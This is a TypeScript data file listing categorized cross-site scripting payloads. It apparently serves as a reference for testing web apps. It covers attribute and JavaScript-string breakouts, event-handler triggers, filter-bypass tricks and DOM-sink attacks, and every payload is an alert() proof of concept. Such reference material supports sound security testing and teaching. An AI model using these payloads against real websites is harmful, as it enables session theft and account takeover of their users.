export type PayloadCategory =
  | 'basic'
  | 'attribute-injection'
  | 'event-handler'
  | 'javascript-context'
  | 'filter-bypass'
  | 'dom-based'

export interface XSSPayload {
  id: string
  name: string
  category: PayloadCategory
  payload: string
  description: string
  context: string
}

export const CATEGORY_LABELS: Record<PayloadCategory, string> = {
  'basic': 'Basic Script Tags',
  'attribute-injection': 'Attribute Injection',
  'event-handler': 'Event Handlers',
  'javascript-context': 'JavaScript Context',
  'filter-bypass': 'Filter Bypass',
  'dom-based': 'DOM-Based',
}

export const CATEGORY_COLORS: Record<PayloadCategory, string> = {
  'basic': 'bg-red-900/40 text-red-300 border-red-700',
  'attribute-injection': 'bg-orange-900/40 text-orange-300 border-orange-700',
  'event-handler': 'bg-yellow-900/40 text-yellow-300 border-yellow-700',
  'javascript-context': 'bg-purple-900/40 text-purple-300 border-purple-700',
  'filter-bypass': 'bg-pink-900/40 text-pink-300 border-pink-700',
  'dom-based': 'bg-blue-900/40 text-blue-300 border-blue-700',
}

export const XSS_PAYLOADS: XSSPayload[] = [
  // Basic
  {
    id: 'basic-1',
    name: 'Classic Script Tag',
    category: 'basic',
    payload: '<script>alert("XSS")</script>',
    description: 'The most straightforward XSS vector. Works when user input is placed directly in HTML with no encoding.',
    context: 'HTML body / innerHTML',
  },
  {
    id: 'basic-2',
    name: 'Script with document.cookie',
    category: 'basic',
    payload: '<script>alert(document.cookie)</script>',
    description: 'Tests if session cookies are accessible (i.e., not HttpOnly).',
    context: 'HTML body',
  },
  {
    id: 'basic-3',
    name: 'Image Tag onerror',
    category: 'basic',
    payload: '<img src=x onerror=alert("XSS")>',
    description: 'Injects an image with a broken src. The onerror handler fires immediately.',
    context: 'HTML body',
  },
  {
    id: 'basic-4',
    name: 'SVG onload',
    category: 'basic',
    payload: '<svg onload=alert("XSS")>',
    description: 'SVG elements support event handlers inline. Fires on render.',
    context: 'HTML body',
  },
  {
    id: 'basic-5',
    name: 'Body onload',
    category: 'basic',
    payload: '<body onload=alert("XSS")>',
    description: 'Injects a body tag with an onload handler. Works in some poorly sanitised innerHTML contexts.',
    context: 'HTML body',
  },
  // Attribute injection
  {
    id: 'attr-1',
    name: 'Break out of double-quoted attribute',
    category: 'attribute-injection',
    payload: '" onmouseover="alert(\'XSS\')" x="',
    description: 'Closes the current attribute with ", injects a new event handler, then opens a harmless attribute to avoid syntax errors.',
    context: 'HTML attribute value (double-quoted)',
  },
  {
    id: 'attr-2',
    name: 'Break out of single-quoted attribute',
    category: 'attribute-injection',
    payload: "' onmouseover='alert(\"XSS\")' x='",
    description: 'Same as above but for single-quoted attributes.',
    context: 'HTML attribute value (single-quoted)',
  },
  {
    id: 'attr-3',
    name: 'Inject into href',
    category: 'attribute-injection',
    payload: 'javascript:alert("XSS")',
    description: 'If user input is placed in an href/src without URL validation, this executes on click.',
    context: 'href / src / action attributes',
  },
  {
    id: 'attr-4',
    name: 'Break out of unquoted attribute',
    category: 'attribute-injection',
    payload: 'x onmouseover=alert("XSS")',
    description: 'Breaks out of unquoted HTML attributes using a space.',
    context: 'Unquoted HTML attribute',
  },
  {
    id: 'attr-5',
    name: 'data-URI in src',
    category: 'attribute-injection',
    payload: 'data:text/html,<script>alert("XSS")</script>',
    description: 'Uses a data: URI to execute script via src/href in older browsers.',
    context: 'href / iframe src',
  },
  // Event handlers
  {
    id: 'event-1',
    name: 'onfocus autofocus',
    category: 'event-handler',
    payload: '<input autofocus onfocus=alert("XSS")>',
    description: 'Automatically focuses an input and triggers onfocus, requiring no user interaction.',
    context: 'HTML body',
  },
  {
    id: 'event-2',
    name: 'onerror on script',
    category: 'event-handler',
    payload: '<script src=x onerror=alert("XSS")></script>',
    description: 'A script tag with a bad src fires onerror when the resource fails to load.',
    context: 'HTML body',
  },
  {
    id: 'event-3',
    name: 'onanimationend CSS',
    category: 'event-handler',
    payload: '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend="alert(\'XSS\')"></div>',
    description: 'Triggers via a CSS animation end event. Useful when script-related attributes are filtered.',
    context: 'HTML body with style support',
  },
  {
    id: 'event-4',
    name: 'Details ontoggle',
    category: 'event-handler',
    payload: '<details open ontoggle=alert("XSS")>',
    description: 'HTML5 details element fires ontoggle when opened. "open" attribute fires it immediately.',
    context: 'HTML body',
  },
  {
    id: 'event-5',
    name: 'Video onerror',
    category: 'event-handler',
    payload: '<video><source onerror=alert("XSS")></video>',
    description: 'Source tag inside video fires onerror when the media fails to load.',
    context: 'HTML body',
  },
  // JavaScript context
  {
    id: 'js-1',
    name: 'Break out of single-quoted JS string',
    category: 'javascript-context',
    payload: "';alert('XSS')//",
    description: "Closes the string literal with ', executes alert, then comments out the rest of the line.",
    context: "var x = '...USER_INPUT...'",
  },
  {
    id: 'js-2',
    name: 'Break out of double-quoted JS string',
    category: 'javascript-context',
    payload: '";alert("XSS")//',
    description: 'Same as above for double-quoted strings.',
    context: 'var x = "...USER_INPUT..."',
  },
  {
    id: 'js-3',
    name: 'Template literal escape',
    category: 'javascript-context',
    payload: '`-alert("XSS")-`',
    description: 'Breaks out of a template literal and injects an expression.',
    context: 'var x = `...USER_INPUT...`',
  },
  {
    id: 'js-4',
    name: 'JSON context break',
    category: 'javascript-context',
    payload: '"};</script><script>alert("XSS")//',
    description: 'Terminates a JSON object embedded in a script block, closes the script, and opens a new one.',
    context: '<script>var data = {"key": "USER_INPUT"}',
  },
  // Filter bypass
  {
    id: 'bypass-1',
    name: 'Mixed case bypass',
    category: 'filter-bypass',
    payload: '<ScRiPt>alert("XSS")</sCrIpT>',
    description: 'Bypasses case-sensitive keyword filters (e.g., blocking "script" but not "Script").',
    context: 'Filters: case-sensitive keyword match',
  },
  {
    id: 'bypass-2',
    name: 'Double-encoding',
    category: 'filter-bypass',
    payload: '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E',
    description: 'Double URL-encodes the payload. Triggers when the server URL-decodes twice before rendering.',
    context: 'URL parameter decoded twice',
  },
  {
    id: 'bypass-3',
    name: 'HTML entity encoding',
    category: 'filter-bypass',
    payload: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
    description: 'HTML entities that a browser may decode before the script is parsed.',
    context: 'HTML attribute / innerHTML with entity decoding',
  },
  {
    id: 'bypass-4',
    name: 'Script tag with null byte',
    category: 'filter-bypass',
    payload: '<scri\x00pt>alert("XSS")</scri\x00pt>',
    description: 'Null byte injection to confuse regex-based filters.',
    context: 'Filters: null-byte unaware regex',
  },
  {
    id: 'bypass-5',
    name: 'Tab/newline obfuscation',
    category: 'filter-bypass',
    payload: '<img\tsrc=x\nonerror\t=\nalert("XSS")>',
    description: 'Uses tabs and newlines between tag attributes to bypass filters that match exact whitespace.',
    context: 'Filters: space-only whitespace matching',
  },
  {
    id: 'bypass-6',
    name: 'Nested tags',
    category: 'filter-bypass',
    payload: '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    description: 'A filter that removes <script> once may leave this intact, which the browser still parses.',
    context: 'Filters: single-pass <script> removal',
  },
  // DOM-based
  {
    id: 'dom-1',
    name: 'Hash-based DOM XSS',
    category: 'dom-based',
    payload: '#<img src=x onerror=alert("XSS")>',
    description: 'Targets apps that read window.location.hash and write it to the DOM unsafely.',
    context: 'window.location.hash → innerHTML',
  },
  {
    id: 'dom-2',
    name: 'document.write sink',
    category: 'dom-based',
    payload: '<script>alert("XSS")</script>',
    description: 'When user-controlled data flows into document.write() without encoding.',
    context: 'document.write(userInput)',
  },
  {
    id: 'dom-3',
    name: 'eval() sink',
    category: 'dom-based',
    payload: "alert('XSS')",
    description: 'When user-controlled data is passed directly to eval().',
    context: 'eval(userInput)',
  },
  {
    id: 'dom-4',
    name: 'innerHTML sink',
    category: 'dom-based',
    payload: '<img src=x onerror=alert("XSS")>',
    description: 'When user input is assigned to element.innerHTML without sanitisation.',
    context: 'element.innerHTML = userInput',
  },
  {
    id: 'dom-5',
    name: 'postMessage injection',
    category: 'dom-based',
    payload: '{"type":"render","data":"<img src=x onerror=alert(\'XSS\')>"}',
    description: 'Targets apps that receive postMessage data and render it without validation.',
    context: 'window.addEventListener("message", ...)',
  },
]
